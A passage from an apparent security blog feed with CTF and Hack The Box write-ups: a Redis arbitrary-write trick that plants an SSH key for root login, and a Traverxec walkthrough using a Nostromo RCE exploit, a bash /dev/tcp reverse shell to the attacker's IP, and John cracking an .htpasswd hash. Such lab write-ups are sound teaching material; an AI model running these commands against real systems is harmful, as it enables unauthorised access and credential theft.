</span></span><span class="line"><span class="cl">aof_last_rewrite_time_sec:-1
</span></span><span class="line"><span class="cl">aof_current_rewrite_time_sec:-1
</span></span><span class="line"><span class="cl">aof_last_bgrewrite_status:ok
</span></span><span class="line"><span class="cl">aof_last_write_status:ok
</span></span><span class="line"><span class="cl">aof_last_cow_size:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stats</span>
</span></span><span class="line"><span class="cl">total_connections_received:1
</span></span><span class="line"><span class="cl">total_commands_processed:1
</span></span><span class="line"><span class="cl">instantaneous_ops_per_sec:0
</span></span><span class="line"><span class="cl">total_net_input_bytes:31
</span></span><span class="line"><span class="cl">total_net_output_bytes:11468
</span></span><span class="line"><span class="cl">instantaneous_input_kbps:0.00
</span></span><span class="line"><span class="cl">instantaneous_output_kbps:0.00
</span></span><span class="line"><span class="cl">rejected_connections:0
</span></span><span class="line"><span class="cl">sync_full:0
</span></span><span class="line"><span class="cl">sync_partial_ok:0
</span></span><span class="line"><span class="cl">sync_partial_err:0
</span></span><span class="line"><span class="cl">expired_keys:0
</span></span><span class="line"><span class="cl">expired_stale_perc:0.00
</span></span><span class="line"><span class="cl">expired_time_cap_reached_count:0
</span></span><span class="line"><span class="cl">evicted_keys:0
</span></span><span class="line"><span class="cl">keyspace_hits:0
</span></span><span class="line"><span class="cl">keyspace_misses:0
</span></span><span class="line"><span class="cl">pubsub_channels:0
</span></span><span class="line"><span class="cl">pubsub_patterns:0
</span></span><span class="line"><span class="cl">latest_fork_usec:0
</span></span><span class="line"><span class="cl">migrate_cached_sockets:0
</span></span><span class="line"><span class="cl">slave_expires_tracked_keys:0
</span></span><span class="line"><span class="cl">active_defrag_hits:0
</span></span><span class="line"><span class="cl">active_defrag_misses:0
</span></span><span class="line"><span class="cl">active_defrag_key_hits:0
</span></span><span class="line"><span class="cl">active_defrag_key_misses:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Replication</span>
</span></span><span class="line"><span class="cl">role:master
</span></span><span class="line"><span class="cl">connected_slaves:0
</span></span><span class="line"><span class="cl">master_replid:f4b741e04432090f4eba3ef1fbdb2ce11e405aeb
</span></span><span class="line"><span class="cl">master_replid2:0000000000000000000000000000000000000000
</span></span><span class="line"><span class="cl">master_repl_offset:0
</span></span><span class="line"><span class="cl">second_repl_offset:-1
</span></span><span class="line"><span class="cl">repl_backlog_active:0
</span></span><span class="line"><span class="cl">repl_backlog_size:1048576
</span></span><span class="line"><span class="cl">repl_backlog_first_byte_offset:0
</span></span><span class="line"><span class="cl">repl_backlog_histlen:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># CPU</span>
</span></span><span class="line"><span class="cl">used_cpu_sys:0.271186
</span></span><span class="line"><span class="cl">used_cpu_user:0.278797
</span></span><span class="line"><span class="cl">used_cpu_sys_children:0.000000
</span></span><span class="line"><span class="cl">used_cpu_user_children:0.000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Cluster</span>
</span></span><span class="line"><span class="cl">cluster_enabled:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Keyspace</span>
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt;
</span></span></code></pre></div><p>The next thing I tried was writing a file to <code>/tmp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /tmp
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename choropys.php
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; <span class="nb">set</span> <span class="nb">test</span> <span class="s2">&#34;choropys&#34;</span>
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; save
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt;
</span></span></code></pre></div><p>I exited from <code>redis-cli</code> and immediately checked the file I wrote under <code>/tmp</code>. It&rsquo;s there and the owner is root!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -l /tmp/choropys.php
</span></span><span class="line"><span class="cl">-rw-rw---- <span class="m">1</span> root root <span class="m">112</span> Sep <span class="m">18</span> 11:45 /tmp/choropys.php
</span></span></code></pre></div><p>This arbitrary file write lack the execute permissions, but I remember from Hack The Box Postman that it is possible to use this to overwite the SSH <code>authorized_keys</code> file (see <a href="https://0xdf.gitlab.io/2020/03/14/htb-postman.html">this writeup</a> by 0xdf). So I can try to ovewrite the root&rsquo;s <code>authorized_keys</code> file.</p>
<p>First, I need to generate a pair of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ mkdir .ssh
</span></span><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh-keygen -t rsa
</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
</span></span><span class="line"><span class="cl">Enter file in which to save the key <span class="o">(</span>/home/user/.ssh/id_rsa<span class="o">)</span>:
</span></span><span class="line"><span class="cl">Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:
</span></span><span class="line"><span class="cl">Enter same passphrase again:
</span></span><span class="line"><span class="cl">Your identification has been saved in /home/user/.ssh/id_rsa
</span></span><span class="line"><span class="cl">Your public key has been saved in /home/user/.ssh/id_rsa.pub
</span></span><span class="line"><span class="cl">The key fingerprint is:
</span></span><span class="line"><span class="cl">SHA256:AVk3h1vdyP/x1KCcBr/IQY7eac9vzZUUrMx/pNkB0KI user@redlike-20edff3e85f553f2-55b895664b-szch7
</span></span><span class="line"><span class="cl">The key<span class="err">&#39;</span>s randomart image is:
</span></span><span class="line"><span class="cl">+---<span class="o">[</span>RSA 3072<span class="o">]</span>----+
</span></span><span class="line"><span class="cl"><span class="p">|</span>      .o. oo+o.o <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>      .. .++.o<span class="o">=</span>o.<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>        .+.*+oooo<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>        .E+ *+ +<span class="o">=</span><span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>       .So <span class="o">=</span> .o**<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>        . * . oo*<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>         . o   oo<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>            o . o<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>             o.  <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</span></span></code></pre></div><p>Then I will have to wrap the SSH public key with two extra newlines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ <span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; spaced_key.txt
</span></span></code></pre></div><p>Now the key can be stored in Redis using the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ cat spaced_key.txt <span class="p">|</span> redis-cli -x <span class="nb">set</span> spaced_key.txt
</span></span><span class="line"><span class="cl">OK
</span></span></code></pre></div><p>Then I can just set the database file name to  <code>authorized_keys</code> and save that under <code>/root/.ssh/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ redis-cli
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /root/.ssh
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; save
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt;
</span></span></code></pre></div><p>And it worked, I can SSH login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh root@redlike-20edff3e85f553f2-55b895664b-szch7
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;redlike-20edff3e85f553f2-55b895664b-szch7 (10.112.8.36)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:m9vzgGyWcCXB1tg0uLHYCKCaDNZFUnbeSirAvvLkYxU.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>redlike-20edff3e85f553f2-55b895664b-szch7,10.112.8.36<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Documentation:  https://help.ubuntu.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Management:     https://landscape.canonical.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Support:        https://ubuntu.com/advantage
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">This system has been minimized by removing packages and content that are
</span></span></span><span class="line"><span class="cl"><span class="s1">not required on a system that users do not log into.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span class="line"><span class="cl">applicable law.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@redlike-20edff3e85f553f2-55b895664b-szch7:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@redlike-20edff3e85f553f2-55b895664b-szch7:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">--w------- <span class="m">1</span> root root <span class="m">39</span> Sep <span class="m">16</span> 14:43 flag.txt
</span></span><span class="line"><span class="cl">root@redlike-20edff3e85f553f2-55b895664b-szch7:~# cat flag.txt
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>69dc14707af23b728ebd1363715ec890<span class="o">}</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Traverxec</title>
      <link>https://fahmifj.github.io/hackthebox/traverxec/</link>
      <pubDate>Fri, 06 Aug 2021 16:12:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/traverxec/</guid>
      <description>Code execution with path traversal</description>
      <content:encoded><![CDATA[<p>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on <code>journalctl</code> binary, and this could be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Path Traversal</li>
<li>Sudo exploitation on <code>journalctl</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Metasploit</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan discovers two open ports: SSH on port 22 and a Nostromo web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p22,80 -sC -sV  -oA nmap/10-tcp-allport-script-traverxec 10.10.10.165
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-13 16:11 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.165
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.44s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    nostromo 1.9.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nostromo 1.9.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: TRAVERXEC
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.71 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---nostromo">TCP 80 - Nostromo</h3>
<p>The hosted site is a personal website of David White.</p>
<p><div class="img-container"><img src="imgs/image-20210714031626971.png" alt="image-20210714031626971"  /></div>
</p>
<p>At the bottom of the page, there is a contact form with 4 input vectors.</p>
<p><div class="img-container"><img src="imgs/image-20210714031846286.png" alt="image-20210714031846286"  /></div>
</p>
<p>I submitted some values  and then started to observe the network traffic, but nothing happen there.</p>
<p><div class="img-container"><img src="imgs/image-20210714032010619.png" alt="image-20210714032010619"  /></div>
</p>
<p>I  ran gobuster, but it also didn&rsquo;t find any interesting.</p>
<h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p>From previous <code>nmap</code>, nmap identified the <code>nostromo</code> version to be 1.9.6. Feeding that version on <code>searchsploit</code> pops a remote code execution exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ searchsploit nostromo 1.9.6         
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                                               <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">nostromo 1.9.6 - Remote Code Execution                                                       <span class="p">|</span> multiple/remote/47837.py
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">Shellcodes: No Results
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="nostromo-rce-cve-2019-16278-metasploit">Nostromo RCE CVE-2019-16278 (Metasploit)</h4>
<p>Metasploit also has a module for the Nostromo 1.9.6 RCE and I will use that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ msfconsole -q
</span></span><span class="line"><span class="cl">msf6 &gt; search nostromo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
</span></span><span class="line"><span class="cl"><span class="o">================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                   Disclosure Date  Rank  Check  Description</span>
</span></span><span class="line"><span class="cl">   -  ----                                   ---------------  ----  -----  -----------
</span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/http/nostromo_code_exec
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 &gt; use <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload cmd/unix/reverse_perl
</span></span></code></pre></div><p>Once all the configs are set, I will run the exploits. This results in an interactive shell access as <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.34:53 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Configuring Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span> target
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending cmd/unix/reverse_perl <span class="nb">command</span> payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.34:53 -&gt; 10.10.10.165:52716<span class="o">)</span> at 2021-07-13 16:31:29 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">hostname <span class="o">&amp;&amp;</span> ip a
</span></span><span class="line"><span class="cl">traverxec
</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/ether 00:50:56:b9:a0:f8 brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="cl">    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span></code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I will create another interactive shell session so I can upgrade my shell with the PTY trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">which bash
</span></span><span class="line"><span class="cl">/usr/bin/bash
</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.34/53 0&gt;&amp;1&#34;</span> <span class="p">&amp;</span>
</span></span></code></pre></div><p>On my new session:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52718</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>421<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ script /dev/null -c bash 
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>     
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ stty cols <span class="m">127</span> rows <span class="m">30</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-david">Shell as david</h3>
<h4 id="nostromo-config">Nostromo config</h4>
<p>The <code>nostromo</code> config file under <code>/var/nostromo/conf</code> reveals that there is a <code>.htpasswd</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
</span></span><span class="line"><span class="cl"><span class="c1"># MAIN [MANDATORY]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">servername              traverxec.htb
</span></span><span class="line"><span class="cl">serverlisten            *
</span></span><span class="line"><span class="cl">serveradmin             david@traverxec.htb
</span></span><span class="line"><span class="cl">serverroot              /var/nostromo
</span></span><span class="line"><span class="cl">servermimes             conf/mimes
</span></span><span class="line"><span class="cl">docroot                 /var/nostromo/htdocs
</span></span><span class="line"><span class="cl">docindex                index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># LOGS [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">logpid                  logs/nhttpd.pid
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SETUID [RECOMMENDED]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user                    www-data
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># BASIC AUTHENTICATION [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">htaccess                .htaccess
</span></span><span class="line"><span class="cl">htpasswd                /var/nostromo/conf/.htpasswd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ALIASES [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/icons                  /var/nostromo/icons
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># HOMEDIRS [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">homedirs                /home
</span></span><span class="line"><span class="cl">homedirs_public         public_www
</span></span></code></pre></div><p>This<code>.htpasswd </code> file contains a password hash for user david.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
</span></span><span class="line"><span class="cl">david:<span class="nv">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd <span class="p">|</span> grep sh <span class="o">&amp;&amp;</span> ls -l /home
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">david:x:1000:1000:david,,,:/home/david:/bin/bash
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 david
</span></span></code></pre></div><h4 id="password-cracking">Password Cracking</h4>
<p><code>JtR</code> can recover the password easily.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./john.exe hashes/traverxec-david.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                                  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1</span>$ <span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">Nowonly4me       <span class="o">(</span>david<span class="o">)</span>
</span></span><span class="line"><span class="cl">1g 0:00:00:43 DONE <span class="o">(</span>2021-07-14 03:44<span class="o">)</span> 0.02307g/s 244113p/s 244113c/s 244113C/s NuiKo910..Noury
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>But turns out it&rsquo;s not a reused password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ su david
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">su: Authentication failure
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ 
</span></span></code></pre></div><h4 id="path-traversal---david-home-directory">Path Traversal - David home directory</h4>
<p>The david home directory is not readable by others, but it allows execute permissions. With that, I can determine what files all are available under david&rsquo;s home directory by spamming one character and leverage the tab completion. This is one of the benefits of doing a shell upgrade!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/
</span></span><span class="line"><span class="cl">ls: cannot open directory <span class="s1">&#39;/home/david/&#39;</span>: Permission denied
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 /home/david/
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/.ssh
